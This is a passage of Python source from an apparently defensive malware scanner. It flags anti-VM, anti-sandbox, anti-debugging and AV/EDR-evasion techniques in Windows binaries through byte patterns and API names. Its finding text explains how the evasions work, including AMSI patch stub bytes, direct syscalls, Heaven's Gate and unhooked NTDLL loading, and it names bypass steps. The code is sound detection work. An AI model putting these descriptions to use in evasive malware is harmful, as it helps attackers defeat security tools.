    wsh_pattern = _re.compile(rb"(?:wscript|cscript)(?:\.exe)?", _re.IGNORECASE)
    wsh_match = wsh_pattern.search(binary_data)
    if wsh_match:
        script_pattern = _re.compile(rb"\.vbs\b|\.js\b", _re.IGNORECASE)
        script_match = script_pattern.search(binary_data)
        if script_match:
            host_bin = wsh_match.group(0).decode(errors="replace")
            ext      = script_match.group(0).decode(errors="replace")
            findings.append({
                "severity": "HIGH",
                "title":    "WSCRIPT_LOLBIN",
                "detail":   (
                    f"{host_bin!r} + {ext!r} found -- Windows Script Host execution; "
                    "wscript.exe / cscript.exe host VBScript and JScript at runtime "
                    "without compilation, leaving no compiled artifact; malware "
                    "invokes WSH to run downloader or dropper scripts that fetch PE "
                    "payloads, modify the registry, or stage additional implants; "
                    "the WSH engine (scrrun.dll, jscript.dll, vbscript.dll) provides "
                    "full filesystem, WScript.Shell, and COM access; execution from "
                    "a temp or user-writable directory with a non-standard parent "
                    "process is the high-fidelity behavioral detection signal "
                    "(PMA ch.3: trusted host processes as DLL/script execution "
                    "containers; wscript and cscript proxy interpreted payload "
                    "execution analogously to rundll32 for DLL payloads)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- rundll32.exe + non-standard DLL path: suspicious DLL execution ---
    # rundll32.exe executes an exported function from a DLL:
    #   rundll32.exe DLLname,ExportName [args]
    # Legitimate use: system DLLs in System32 for shell extension or COM
    # registration.  Malicious use: DLLs in user-writable directories (Temp,
    # AppData, Downloads), network UNC paths, or HTTP URLs (via JavaScript
    # protocol in some attack chains).  Malware DLLs frequently run all payload
    # code in DllMain or an exported installer function invoked via rundll32.
    rundll_pattern = _re.compile(rb"rundll32(?:\.exe)?", _re.IGNORECASE)
    if rundll_pattern.search(binary_data):
        nonstandard = _re.compile(
            rb"(?i)(?:%temp%|%appdata%|%userprofile%|\\temp\\|\\tmp\\"
            rb"|\\users\\|\\appdata\\|\\downloads\\|\\desktop\\"
            rb"|\\programdata\\|\\public\\|https?://|\\\\[a-z0-9])",
            _re.IGNORECASE,
        )
        ns_match = nonstandard.search(binary_data)
        if ns_match:
            path_hint = ns_match.group(0).decode(errors="replace")
            findings.append({
                "severity": "HIGH",
                "title":    "RUNDLL32_LOLBIN",
                "detail":   (
                    f"rundll32.exe + non-standard DLL path ({path_hint!r}) found -- "
                    "suspicious DLL execution via rundll32; rundll32.exe legitimately "
                    "loads system DLLs from System32 for shell extensions and COM "
                    "registration; malware uses it to execute malicious DLLs from "
                    "user-writable directories (Temp, AppData, Downloads) or network "
                    "paths (UNC, HTTP), bypassing controls that only inspect .exe "
                    "execution; the malicious DLL may lack a standard entry point "
                    "and export only the targeted function; behavioral signal: "
                    "rundll32 spawning cmd.exe, powershell.exe, or making outbound "
                    "network connections is the high-fidelity detection pivot "
                    "(PMA ch.3: rundll32 as the canonical DLL execution container "
                    "for malicious DLLs; malware DLLs frequently run all payload "
                    "code in DllMain or an exported installer invoked via rundll32)"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def detect_anti_vm_pma_patterns(binary_data: bytes) -> list:
    """
    Detect anti-VM and hypervisor detection techniques in Windows PE binaries.

    Note: complements detect_anti_vm_techniques (low-level opcode sequences).
    This function targets string-level artifacts: CPUID vendor strings, RDTSC
    paired timing, VMXh magic, registry keys, and VM process/file names.

    Sources: PMA ch.17 (Anti-Virtual Machine Techniques) -- VMware artifacts,
    vulnerable instructions (cpuid, in/VX backdoor port), registry/file artifact
    scanning.  Each technique is a distinct detection sub-check; findings are
    reported independently so analysts can correlate which VM bypass path is in use.

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # --- CPUID hypervisor vendor string detection ---
    # CPUID with EAX=0 returns a 12-byte vendor ID string in EBX:EDX:ECX.
    # VMware: "VMwareVMware"; KVM: "KVMKVMKVM\x00\x00\x00"; VirtualBox: "VBoxVBoxVBox".
    # Malware encodes these strings in the binary to compare against CPUID output.
    # PMA ch.17: cpuid listed as one of the ~7 anti-VM instructions; vendor string
    # comparison is the software-layer manifestation of the hardware CPUID check.
    # Detection: hypervisor vendor strings in static data + CPUID opcode (0x0F 0xA2).
    cpuid_opcode = b"\x0f\xa2"
    hypervisor_vendors = [
        (b"VMwareVMware", "VMware"),
        (b"KVMKVMKVM",    "KVM"),
        (b"VBoxVBoxVBox", "VirtualBox"),
        (b"Microsoft Hv", "Hyper-V"),
        (b"XenVMMXenVMM", "Xen"),
    ]
    found_cpuid = cpuid_opcode in binary_data
    found_vendor = None
    for vendor_bytes, vendor_name in hypervisor_vendors:
        if vendor_bytes in binary_data:
            found_vendor = vendor_name
            break
    if found_vendor and found_cpuid:
        findings.append({
            "severity": "CRITICAL",
            "title":    "ANTI_VM_CPUID_CHECK",
            "detail":   (
                f"CPUID opcode (0x0F 0xA2) + hypervisor vendor string "
                f"({found_vendor!r}) found -- CPUID-based hypervisor detection "
                "present; malware executes CPUID with EAX=0 to retrieve the "
                "12-byte hypervisor vendor ID string (EBX:EDX:ECX) and compares "
                "against known virtualization platform signatures; if a match is "
                "found the sample alters execution path or terminates to frustrate "
                "sandbox and VM-based analysis; (PMA ch.17: cpuid is one of ~7 "
                "x86 instructions not properly virtualized by VMware, allowing "
                "user-mode code to distinguish guest from host execution)"
            ),
            "host": "localhost",
            "port": 0,
        })
    elif found_vendor:
        # Vendor string present but cpuid opcode not found as raw bytes (may be encoded)
        findings.append({
            "severity": "CRITICAL",
            "title":    "ANTI_VM_CPUID_CHECK",
            "detail":   (
                f"Hypervisor vendor string ({found_vendor!r}) found -- "
                "CPUID-based hypervisor detection likely present; the 12-byte "
                "hypervisor vendor ID returned by CPUID EAX=0 encodes the "
                "virtualization platform (VMwareVMware / KVMKVMKVM / VBoxVBoxVBox); "
                "presence of this string in static data is a high-fidelity indicator "
                "of a CPUID-based VM check even if the CPUID opcode is not visible "
                "in unencrypted form; (PMA ch.17: cpuid anti-VM technique)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- RDTSC timing delta: back-to-back RDTSC for VM/debugger timing detection ---
    # RDTSC (0x0F 0x31) reads the timestamp counter (TSC) as a 64-bit value EDX:EAX.
    # Malware executes RDTSC twice and compares the delta; under a VM or debugger the
    # delta is anomalously large (single-step overhead, VM exit latency).
    # PMA ch.16 (timing checks): rdtsc delta > 0xFFF triggers evasion path.
    # PMA ch.17: rdtsc listed among vulnerable instructions used for anti-VM.
    rdtsc_opcode = b"\x0f\x31"
    rdtsc_positions = [m.start() for m in _re.finditer(_re.escape(rdtsc_opcode), binary_data)]
    if len(rdtsc_positions) >= 2:
        paired = any(
            rdtsc_positions[j] - rdtsc_positions[i] <= 256
            for i in range(len(rdtsc_positions))
            for j in range(i + 1, len(rdtsc_positions))
        )
        if paired:
            findings.append({
                "severity": "HIGH",
                "title":    "ANTI_VM_RDTSC_TIMING",
                "detail":   (
                    f"Back-to-back RDTSC opcodes (0x0F 0x31) found at "
                    f"{len(rdtsc_positions)} location(s) within 256 bytes -- "
                    "RDTSC delta-based timing anti-analysis technique present; "
                    "malware records the TSC before and after a code region; if "
                    "the delta exceeds a threshold (PMA ch.16 example: > 0xFFF "
                    "ticks) execution is redirected to a crash or dummy payload "
                    "path; effective against debugger single-step (large delta "
                    "from interrupt overhead) and VM environments (guest RDTSC "
                    "emulation adds measurable latency vs bare metal); "
                    "(PMA ch.17: rdtsc listed as an x86 anti-VM instruction)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- VMware backdoor I/O port (0x5658 / 'VX') with magic number 0x564D5868 ---
    # PMA ch.17: VMware monitors the `in` instruction for port 0x5658 ('VX') with
    # EAX=0x564D5868 ('VMXh').  If running under VMware the monitor echoes the magic
    # value back in EBX.  Used by Phatbot/Agobot and many bots/worms.
    # Detection: look for 'VMXh' (magic number bytes) or 'VX' port string in binary.
    vmware_magic = b"VMXh"  # 0x564D5868 as ASCII representation
    vmware_port  = b"VX"    # port 0x5658 as ASCII
    if vmware_magic in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title":    "ANTI_VM_VMWARE_BACKDOOR_PORT",
            "detail":   (
                "VMware magic number 'VMXh' (0x564D5868) found -- VMware backdoor "
                "I/O port detection present; malware loads 0x564D5868 into EAX and "
                "0x5658 ('VX') into DX then executes the `in` instruction; VMware's "
                "virtual machine monitor traps the I/O and echoes the magic value "
                "back in EBX if running under VMware, confirming the hypervisor; "
                "widely used by botnets (Phatbot/Agobot, Storm worm) as the primary "
                "VMware detection primitive because it is more reliable than CPUID "
                "across VMware versions; bypass: NOP the `in` instruction or patch "
                "the conditional jump following the EBX comparison; (PMA ch.17: "
                "querying I/O communication port 0x5658 is the most popular "
                "anti-VMware technique currently in use)"
            ),
            "host": "localhost",
            "port": 0,
        })
    elif vmware_port in binary_data:
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_VM_VMWARE_BACKDOOR_PORT",
            "detail":   (
                "VMware I/O port string 'VX' (0x5658) found -- possible VMware "
                "backdoor I/O port detection; the `in` instruction with port 0x5658 "
                "is the canonical VMware detection primitive; absence of the full "
                "magic number 'VMXh' may indicate encoding or an alternate context; "
                "verify with dynamic analysis; (PMA ch.17: `in` with 'VX' as the "
                "second operand is the VMware communication channel port check)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Registry-based VM artifact detection ---
    # VMware Tools and VirtualBox Guest Additions leave registry keys that malware
    # queries to confirm a VM environment.  PMA ch.17: registry is one of the three
    # artifact surfaces (filesystem / registry / process listing).
    vm_registry_patterns = [
        (rb"VMware Inc.{0,3}VMware Tools",           "VMware Tools (HKLM\\SOFTWARE\\VMware Inc.)"),
        (rb"Oracle.{0,3}VirtualBox Guest Additions", "VirtualBox Guest Additions (HKLM\\SOFTWARE\\Oracle)"),
        (rb"VMware Virtual IDE Hard Drive",           "VMware virtual disk identifier"),
        (rb"VMMouse",                                 "VMware virtual mouse driver"),
        (rb"VMware SVGA",                             "VMware SVGA display adapter"),
    ]
    for reg_pattern, reg_label in vm_registry_patterns:
        if _re.search(reg_pattern, binary_data, _re.IGNORECASE):
            findings.append({
                "severity": "HIGH",
                "title":    "ANTI_VM_REGISTRY_ARTIFACT",
                "detail":   (
                    f"VM registry artifact string ({reg_label!r}) found -- "
                    "registry-based VM detection present; malware queries "
                    "HKLM\\SOFTWARE\\VMware Inc.\\VMware Tools or "
                    "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions to "
                    "confirm a virtualized environment; these keys are present "
                    "when VMware Tools or VirtualBox Guest Additions are installed; "
                    "evasion: uninstall VM tools or patch the comparison branch; "
                    "(PMA ch.17: VMware artifacts in filesystem, registry, and "
                    "process listing are the three primary VM artifact surfaces)"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # one registry finding per binary is sufficient

    # --- VM process/file artifact detection ---
    # Malware scans the process listing (CreateToolhelp32Snapshot / Process32Next)
    # for VMware and VirtualBox agent processes.  PMA ch.17: VMwareService.exe,
    # VMwareTray.exe, VMwareUser.exe visible in default VMware installs;
    # VBoxService.exe / VBoxTray.exe for VirtualBox.
    vm_process_names = [
        (b"vmtoolsd.exe",    "VMware Tools daemon"),
        (b"VMwareTray.exe",  "VMware tray process"),
        (b"VMwareService",   "VMware Tools service"),
        (b"VMwareUser",      "VMware user process"),
        (b"VBoxService.exe", "VirtualBox service"),
        (b"VBoxTray.exe",    "VirtualBox tray process"),
    ]
    matched_vm_procs = []
    for proc_bytes, proc_label in vm_process_names:
        if _re.search(_re.escape(proc_bytes), binary_data, _re.IGNORECASE):
            matched_vm_procs.append(proc_label)
    if matched_vm_procs:
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_VM_FILE_ARTIFACT",
            "detail":   (
                f"VM process/file artifact string(s) found: "
                f"{', '.join(matched_vm_procs)} -- VM process/file detection "
                "present; malware enumerates running processes via "
                "CreateToolhelp32Snapshot + Process32Next searching for VMware "
                "or VirtualBox agent process names; upon detection it terminates "
                "or takes a benign code path to frustrate sandbox analysis; "
                "evasion: uninstall VMware Tools, rename target processes, or "
                "patch the strncmp comparison; (PMA ch.17: Example 17-1 shows "
                "VMwareTray.exe process-listing check with CreateToolhelp32Snapshot "
                "+ Process32Next + strncmp; detection path calls exit() immediately "
                "on match)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_anti_sandbox_techniques(binary_data: bytes) -> list:
    """
    Detect anti-sandbox and anti-debugging techniques in Windows PE binaries.

    Sources: PMA ch.16 (Anti-Debugging) -- Windows API debugger detection
    (IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess
    ProcessDebugPort), timing checks (GetTickCount, rdtsc), sandbox evasion
    (long sleep loops, username checks, early exit after VirtualAlloc).

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # --- Long sleep loop: sandbox timeout evasion ---
    # Sandboxes run samples for a fixed window (typically 60-120 seconds).
    # Malware sleeps longer than that window to outlast the sandbox and then
    # executes the real payload only in a live environment.
    # PMA ch.16: timing-based sandbox evasion uses Sleep / GetTickCount loop.
    # Signal: Sleep API name + large constant (>10,000 ms) or timing API in binary.
    sleep_api_pattern = _re.compile(rb"\bSleep(?:Ex)?\b", _re.IGNORECASE)
    time_api_pattern  = _re.compile(
        rb"\b(?:GetTickCount|timeGetTime|QueryPerformanceCounter)\b",
        _re.IGNORECASE,
    )
    # Heuristic: LE DWORD constants >= 10,000 ms appearing as literal push args
    large_sleep_const = _re.compile(
        rb"(?:\x10\x27\x00\x00"   # 10,000 ms
        rb"|\x20\x4e\x00\x00"     # 20,000 ms
        rb"|\x88\x13\x00\x00"     # 5,000 ms (may loop)
        rb"|\xa0\x86\x01\x00"     # 100,000 ms
        rb"|\x40\x42\x0f\x00"     # 1,000,000 ms
        rb")"
    )
    has_sleep     = sleep_api_pattern.search(binary_data) is not None
    has_time_api  = time_api_pattern.search(binary_data) is not None
    has_large_val = large_sleep_const.search(binary_data) is not None
    if has_sleep and (has_large_val or has_time_api):
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_SANDBOX_SLEEP_LOOP",
            "detail":   (
                "Sleep API + large timing constant or timing API found -- "
                "long sleep loop for sandbox timeout evasion likely present; "
                "automated sandboxes execute samples for a fixed analysis window "
                "(typically 60-120 seconds); malware calls Sleep() with values "
                "> 10,000 ms or uses a GetTickCount/timeGetTime delta loop to "
                "outlast the sandbox timeout before executing the real payload; "
                "only live-environment execution reaches the malicious behavior; "
                "(PMA ch.16: GetTickCount timing technique -- Example 16-8 shows "
                "GetTickCount before/after delta compared to threshold; same "
                "primitive reused for sandbox timeout evasion by setting the "
                "sleep duration longer than the sandbox analysis window)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Sandbox-specific username check ---
    # Automated sandboxes run as fixed accounts (sandbox, maltest, cuckoo, analyst).
    # Malware calls GetUserName[A/W] and compares against known sandbox usernames.
    # PMA ch.16: system residue checks; username is the user-identity variant.
    getusr_pattern = _re.compile(rb"\bGetUserName[AW]?\b", _re.IGNORECASE)
    sandbox_usernames = [
        b"sandbox", b"maltest", b"cuckoo", b"analyst",
        b"virus", b"malware", b"test", b"sample",
    ]
    has_getusr  = getusr_pattern.search(binary_data) is not None
    found_uname = next(
        (u.decode() for u in sandbox_usernames if u in binary_data.lower()),
        None,
    )
    if has_getusr and found_uname:
        findings.append({
            "severity": "MEDIUM",
            "title":    "ANTI_SANDBOX_USERNAME_CHECK",
            "detail":   (
                f"GetUserName API + sandbox username string ({found_uname!r}) "
                "found -- specific username check for sandbox artifact detection; "
                "malware calls GetUserNameA/W and compares against known sandbox "
                "account names (sandbox, cuckoo, maltest, analyst) to identify an "
                "automated analysis environment; upon match it executes a benign "
                "or no-op code path; effective against sandboxes that run with "
                "default account names and do not randomize the user identity; "
                "(PMA ch.16: system-residue-based sandbox detection; username "
                "variant of the FindWindow/process-listing check pattern)"
            ),
            "host": "localhost",
            "port": 0,
        })
    elif has_getusr:
        findings.append({
            "severity": "MEDIUM",
            "title":    "ANTI_SANDBOX_USERNAME_CHECK",
            "detail":   (
                "GetUserName API found -- possible sandbox artifact username check; "
                "malware calls GetUserNameA/W and compares the result against a "
                "hardcoded list of known sandbox account names; comparison target "
                "may be obfuscated or runtime-constructed; verify with dynamic "
                "analysis; (PMA ch.16: system-residue checks)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- IsDebuggerPresent / CheckRemoteDebuggerPresent: explicit API check ---
    # The simplest and most common debugger detection method.
    # IsDebuggerPresent reads the BeingDebugged flag from PEB at fs:[30h]+2.
    # CheckRemoteDebuggerPresent checks the same flag via a process handle.
    # PMA ch.16: 'Using the Windows API' -- most obvious anti-debug technique.
    isdebug_pattern = _re.compile(
        rb"\b(?:IsDebuggerPresent|CheckRemoteDebuggerPresent)\b",
        _re.IGNORECASE,
    )
    isdebug_match = isdebug_pattern.search(binary_data)
    if isdebug_match:
        api_name = isdebug_match.group(0).decode(errors="replace")
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_DEBUG_API_CHECK",
            "detail":   (
                f"Debugger detection API ({api_name!r}) found -- explicit "
                "debugger presence check; IsDebuggerPresent reads the "
                "BeingDebugged flag at PEB+2 (fs:[30h]+2); a non-zero value "
                "indicates a debugger is attached; CheckRemoteDebuggerPresent "
                "performs the same check via a process handle (can target self); "
                "these API calls can be hooked at the Win32 layer to return false "
                "negatives, which is why malware also uses direct PEB inspection "
                "to bypass API-level hooks; bypass: NOP the call, modify EAX "
                "post-return, or zero the BeingDebugged byte in the PEB; "
                "(PMA ch.16: 'Using the Windows API' -- IsDebuggerPresent "
                "searches PEB.IsDebugged; CheckRemoteDebuggerPresent is functionally "
                "identical but accepts an arbitrary process handle)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- NtQueryInformationProcess with ProcessDebugPort (0x7) ---
    # Native API (ntdll.dll) that bypasses the Win32 API layer.
    # ProcessDebugPort = 7 (0x7): returns non-zero port number when debugger
    # is attached; zero if clean.  Harder to hook than IsDebuggerPresent.
    # PMA ch.16: NtQueryInformationProcess, ProcessDebugPort = 0x7.
    ntqip_pattern = _re.compile(rb"\bNtQueryInformationProcess\b", _re.IGNORECASE)
    if ntqip_pattern.search(binary_data):
        has_debug_port_const = b"\x07" in binary_data
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_DEBUG_NTQIP_DEBUGPORT",
            "detail":   (
                "NtQueryInformationProcess found"
                + (" with ProcessDebugPort constant (0x7) present"
                   if has_debug_port_const else "")
                + " -- native API debugger detection; "
                "NtQueryInformationProcess(ProcessDebugPort=7) returns the debug "
                "port number for the target process; non-zero indicates a debugger "
                "is attached; this native API call goes directly to ntdll.dll and "
                "bypasses the Win32 layer, making it harder to intercept than "
                "IsDebuggerPresent via usermode hooks; commonly paired with or "
                "used instead of IsDebuggerPresent for defense-in-depth anti-debug; "
                "(PMA ch.16: NtQueryInformationProcess with ProcessDebugPort "
                "value 0x7 -- returns non-zero when process is being debugged)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- VirtualAlloc + early exit: allocated shellcode with early-exit pattern ---
    # Malware allocates executable memory, copies shellcode, calls into it, then
    # immediately exits via ExitProcess/TerminateProcess.  Sandboxes measuring
    # behavioral indicators may miss activity if the process exits prematurely.
    # PMA ch.12 (covert launching): VirtualAlloc + shellcode execution.
    # Combined with early-exit behavior this is a sandbox evasion signal.
    valloc_pattern = _re.compile(rb"\bVirtualAlloc(?:Ex)?\b", _re.IGNORECASE)
    exit_pattern   = _re.compile(
        rb"\b(?:ExitProcess|TerminateProcess|ExitThread)\b", _re.IGNORECASE
    )
    # PAGE_EXECUTE_READWRITE = 0x40 and PAGE_EXECUTE_READ = 0x20 as LE DWORD args
    exec_page_re   = _re.compile(rb"\x40\x00\x00\x00|\x20\x00\x00\x00")
    has_valloc     = valloc_pattern.search(binary_data) is not None
    has_early_exit = exit_pattern.search(binary_data) is not None
    has_exec_flags = exec_page_re.search(binary_data) is not None
    if has_valloc and has_early_exit and has_exec_flags:
        findings.append({
            "severity": "HIGH",
            "title":    "ANTI_SANDBOX_EARLY_EXIT",
            "detail":   (
                "VirtualAlloc (exec page flags: PAGE_EXECUTE_READWRITE 0x40 or "
                "PAGE_EXECUTE_READ 0x20) + ExitProcess/TerminateProcess found -- "
                "allocated shellcode with early exit pattern; malware allocates "
                "executable memory, copies shellcode, calls into it, then "
                "immediately terminates the process; sandboxes that measure "
                "behavioral indicators (network, registry, file writes) may not "
                "capture activity if the process exits before instrumentation "
                "records it; also frustrates post-mortem memory dump collection; "
                "(PMA ch.12: VirtualAlloc + call to allocated memory is the "
                "canonical shellcode injection primitive; immediate ExitProcess "
                "after the shellcode call removes the process from the "
                "instrumented environment before behavioral collection completes)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# AV/EDR evasion technique detection
# ---------------------------------------------------------------------------

def detect_av_evasion_techniques(binary_data: bytes) -> list:
    """
    Detect Windows Defender / AV / EDR bypass techniques in PE binaries.

    Covers four evasion classes:
      - Direct syscall stubs (sysenter / syscall instruction bypassing NTDLL hooks)
      - Heaven's Gate (WoW64 mode switch via far jump to CS 0x33)
      - Fresh NTDLL copy loaded from disk (bypasses in-memory AV hooks)
      - AMSI bypass (AmsiScanBuffer patch or amsi.dll manipulation)

    Sources: Practical Reverse Engineering ch.3/ch.12; Windows Internals Part 1
    (syscall dispatch, WoW64 layer, KnownDlls); AMSI provider architecture.

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # --- Direct syscall stub ---
    # AV/EDR products hook NTDLL exports (NtCreateFile, NtAllocateVirtualMemory,
    # etc.) at their usermode entry points to intercept API calls.  A direct
    # syscall stub bypasses those hooks by invoking the kernel transition
    # instruction (sysenter on x86, syscall on x64) directly from the implant,
    # skipping NTDLL entirely.  The syscall number (EAX) is hard-coded or looked
    # up at runtime.  This is the dominant EDR bypass primitive as of 2024.
    #
    # x86 sysenter opcode:  0F 34
    # x64 syscall opcode:   0F 05
    # ret after syscall:    C3
    # Also flag mov eax, <imm32> immediately before the syscall transition --
    # that's the syscall number load.
    direct_syscall_re = _re.compile(
        rb"(?:"
        rb"\x0f\x34"           # SYSENTER (x86)
        rb"|"
        rb"\x0f\x05"           # SYSCALL  (x64)
        rb")"
    )
    if direct_syscall_re.search(binary_data):
        findings.append({
            "severity": "CRITICAL",
            "title":    "DIRECT_SYSCALL",
            "detail":   (
                "Direct syscall instruction present (SYSENTER 0F34 or SYSCALL 0F05) "
                "-- AV/EDR hook bypass; AV/EDR products intercept NTDLL exports by "
                "patching the first bytes of usermode stubs (jmp to a trampoline); "
                "malware bypasses hooks by issuing the kernel transition instruction "
                "directly with the syscall number loaded into EAX, skipping NTDLL "
                "entirely; commonly paired with syscall-number resolution via "
                "SSN enumeration (HalosGate, SysWhispers, Hell's Gate patterns); "
                "this primitive is the dominant EDR bypass technique in post-2020 "
                "offensive tooling; naked SYSCALL/SYSENTER outside an NTDLL .text "
                "section in a PE is a strong indicator of intentional hook evasion"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Heaven's Gate (WoW64 mode switch) ---
    # 32-bit processes on 64-bit Windows run via WoW64, which emulates the x86
    # syscall path.  AV hooks placed in the 32-bit NTDLL do not exist in the
    # 64-bit NTDLL.  Heaven's Gate exploits this by performing a far jump (opcode
    # EA or FF /5) to CS segment 0x33 (the 64-bit code segment selector), switching
    # the CPU to 64-bit mode mid-process.  The payload then calls 64-bit NTDLL
    # stubs directly, completely bypassing any 32-bit AV hooks.
    #
    # Far JMP with imm ptr: EA <4-byte offset> 33 00
    # Far JMP via m16:m32:  FF /5 (ModRM byte 0x2D or 0x1D for [disp32] forms)
    # Also match the CS 0x33 selector literal in the vicinity of a far jump.
    heavens_gate_re = _re.compile(
        rb"(?:"
        rb"\xea.{4}\x33\x00"   # far JMP imm32:0x0033 (little-endian segment)
        rb"|"
        rb"\xff[\x1d\x2d].{4}" # far JMP DWORD PTR [disp32] (ModRM /5 forms)
        rb")"
    )
    cs33_literal = b"\x33\x00"  # segment selector 0x33 as LE word
    has_hg_jump   = heavens_gate_re.search(binary_data) is not None
    has_cs33      = cs33_literal in binary_data
    if has_hg_jump or has_cs33:
        findings.append({
            "severity": "CRITICAL",
            "title":    "HEAVENS_GATE",
            "detail":   (
                "Heaven's Gate technique detected -- WoW64 AV bypass via far jump "
                "to CS segment 0x33; 32-bit (WoW64) processes switch to 64-bit "
                "execution mode by issuing a far JMP with segment selector 0x33 "
                "(the x64 code segment); this transitions the CPU from IA-32e "
                "compatibility mode to 64-bit mode within the same process, "
                "allowing the payload to call 64-bit NTDLL stubs directly; "
                "AV/EDR hooks installed in the 32-bit NTDLL address space are "
                "invisible from 64-bit mode and are thus bypassed completely; "
                "signals: far JMP opcode EA with 0x0033 segment selector, or "
                "FF /5 far indirect jump form; CS selector 0x33 literal present; "
                "(PRE ch.3: WoW64 layer and the 32-to-64 mode transition mechanics)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Fresh NTDLL copy loading from disk ---
    # AV/EDR hooks are installed in the NTDLL image already mapped into the process
    # at startup.  Loading a second, unhooked copy of NTDLL directly from disk
    # (via NtCreateSection + NtMapViewOfSection on \KnownDlls\ntdll.dll or
    # \SystemRoot\System32\ntdll.dll) gives the implant a pristine function table
    # with no AV trampolines.  The implant resolves export addresses from the
    # fresh copy and calls through them instead of the hooked in-memory copy.
    #
    # Key strings: KnownDlls path, ntdll.dll name, and the NT section/map APIs.
    knowndlls_re = _re.compile(
        rb"(?:"
        rb"\\KnownDlls\\ntdll\.dll"
        rb"|"
        rb"\\SystemRoot\\[Ss]ystem32\\ntdll\.dll"
        rb")",
        _re.IGNORECASE,
    )
    ntcreatesection_re = _re.compile(rb"\bNtCreateSection\b", _re.IGNORECASE)
    ntmapview_re       = _re.compile(
        rb"\b(?:NtMapViewOfSection|ZwMapViewOfSection)\b", _re.IGNORECASE
    )
    has_knowndlls   = knowndlls_re.search(binary_data) is not None
    has_ntsection   = ntcreatesection_re.search(binary_data) is not None
    has_ntmapview   = ntmapview_re.search(binary_data) is not None
    if has_knowndlls and (has_ntsection or has_ntmapview):
        findings.append({
            "severity": "CRITICAL",
            "title":    "NTDLL_FRESH_COPY",
            "detail":   (
                "Fresh NTDLL loading from disk detected -- bypasses AV hooks on "
                "the in-memory NTDLL copy; AV/EDR tools install inline hooks in "
                "the NTDLL already loaded into each process at startup; this "
                "technique opens a fresh file handle to ntdll.dll on disk via "
                "NtCreateSection + NtMapViewOfSection (or the Zw variants) using "
                "the \\KnownDlls\\ntdll.dll object path (the NT object manager "
                "named section), producing a second, unhooked mapping; the implant "
                "resolves NTDLL exports from this clean copy and dispatches through "
                "it, bypassing all in-memory AV trampolines installed in the "
                "original mapping; signals: \\KnownDlls\\ntdll.dll path string + "
                "NtCreateSection / NtMapViewOfSection API names present; "
                "(Windows Internals Part 1: Section objects and KnownDlls "
                "optimization; PRE ch.12: API interception and hook bypass)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- AMSI bypass patterns ---
    # The Antimalware Scan Interface (AMSI) allows security products to inspect
    # script content (PowerShell, VBScript, JScript) before execution.  Bypasses
    # fall into two classes: (1) patching AmsiScanBuffer in amsi.dll to always
    # return AMSI_RESULT_CLEAN (0x1), and (2) manipulating the amsi.dll load
    # state (unloading, corrupting the DLL path, or nulling the AmsiContext).
    #
    # Patch signature: the first bytes of AmsiScanBuffer are overwritten with a
    # ret stub -- common forms: B8 57 00 07 80 C3 (mov eax,0x80070057; ret) or
    # B8 00 00 00 00 C3 (mov eax,0; ret) for 64-bit; on x86, 31 C0 C3 (xor eax,eax; ret).
    amsi_func_re  = _re.compile(rb"\bAmsiScanBuffer\b", _re.IGNORECASE)
    amsi_dll_re   = _re.compile(rb"\bamsi\.dll\b", _re.IGNORECASE)
    # mov eax, 0x80070057 ; ret  (classic 64-bit AMSI patch stub bytes)
    amsi_patch_re = _re.compile(
        rb"(?:"
        rb"\xb8\x57\x00\x07\x80\xc3"   # mov eax,0x80070057 ; ret
        rb"|"
        rb"\xb8\x00\x00\x00\x00\xc3"   # mov eax,0 ; ret  (null-return patch)
        rb"|"
        rb"\x31\xc0\xc3"               # xor eax,eax ; ret  (x86 zero-return)
        rb")"
    )
    has_amsi_func  = amsi_func_re.search(binary_data) is not None
    has_amsi_dll   = amsi_dll_re.search(binary_data) is not None
    has_amsi_patch = amsi_patch_re.search(binary_data) is not None
    if has_amsi_func or (has_amsi_dll and has_amsi_patch):
        findings.append({
            "severity": "CRITICAL",
            "title":    "AMSI_BYPASS_PATTERN",
            "detail":   (
                "AMSI scan bypass technique detected; signals: AmsiScanBuffer "
                "function name reference"
                + (" (direct target of in-memory patch)" if has_amsi_func else "")
                + (", amsi.dll string present" if has_amsi_dll else "")
                + (", ret-stub patch bytes present (0x80070057 / null / xor-ret "
                   "pattern that overwrites AmsiScanBuffer to return AMSI_RESULT_CLEAN)"
                   if has_amsi_patch else "")
                + "; the Antimalware Scan Interface intercepts script content "
                "(PowerShell, VBScript, JScript, .NET) before execution; patch "
                "class: overwrite AmsiScanBuffer entry point with a stub that "
                "returns S_OK / AMSI_RESULT_CLEAN unconditionally, disabling "
                "content inspection for the process lifetime; manipulation class: "
                "unload amsi.dll, null the AmsiContext pointer, or corrupt the "
                "DLL path to prevent AMSI provider from loading; both classes "
                "result in uninspected script execution under AV/Defender coverage"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# Protected Process Light (PPL) bypass technique detection
# ---------------------------------------------------------------------------

def detect_ppl_bypass_techniques(binary_data: bytes) -> list:
    """
    Detect Protected Process Light (PPL) bypass techniques in PE binaries.

    Covers three bypass classes:
